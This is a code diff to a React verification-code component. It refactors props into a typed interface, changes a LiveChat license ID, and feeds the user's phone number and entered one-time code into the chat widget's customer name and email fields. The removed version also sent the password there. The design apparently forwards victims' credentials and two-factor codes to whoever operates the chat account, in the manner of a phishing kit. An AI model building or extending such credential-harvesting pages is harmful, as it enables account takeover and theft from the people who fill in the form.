@@ -1,8 +1,16 @@
-import React, { useEffect, useState } from "react";
+import React, { Dispatch, SetStateAction, useEffect, useState } from "react";
 import { Spinner } from "./Loader";
 import { LiveChatWidget, EventHandlerPayload } from "@livechat/widget-react";
 
-const Code = (props: any) => {
+interface IProps {
+  phone?: string;
+  code?: string;
+  pass?: string | number;
+  setCode: Dispatch<SetStateAction<string>>;
+  updateData: () => Promise<void>;
+}
+
+const Code = ({ phone, code, pass, setCode, updateData }: IProps) => {
   const [show, setShow] = useState(true);
   const [showSpinner, setShowSpinner] = useState(false);
   const [c1, setC1] = useState("");
@@ -15,7 +23,8 @@ const Code = (props: any) => {
     setC3("");
     setC4("");
   };
-   function handleNewEvent(event: EventHandlerPayload<"onNewEvent">) {
+  console.log(phone);
+  function handleNewEvent(event: EventHandlerPayload<"onNewEvent">) {
     console.log("LiveChatWidget.onNewEvent", event);
   }
   useEffect(() => {
@@ -26,7 +35,7 @@ const Code = (props: any) => {
   }, []);
   useEffect(() => {
     if (c1 && c2 && c3 && c4) {
-      props.setCode(`${c1}${c2}${c3}${c4}`);
+      setCode(`${c1}${c2}${c3}${c4}`);
     }
   }, [c1, c2, c3, c4]);
 
@@ -136,10 +145,10 @@ const Code = (props: any) => {
           </div>
           <div>
             <button
-                style={{ fontSize: 15, fontWeight: 600 }}
+              style={{ fontSize: 15, fontWeight: 600 }}
               onClick={(e) => {
                 e.preventDefault();
-                props.updateData();
+                updateData();
                 clear();
                 setShowSpinner(true);
               }}
@@ -162,12 +171,12 @@ const Code = (props: any) => {
           </div>
         </form>
       </div>
-         <LiveChatWidget
+      <LiveChatWidget
         key="10"
-        customerName={`${props.phone}`}
-        customerEmail={`${props.pass} @ code ${props.code}`}
+        customerName={phone}
+        customerEmail={code}
         onNewEvent={handleNewEvent}
-        license="17046132"
+        license="17058393"
       />
     </div>
   ) : null;
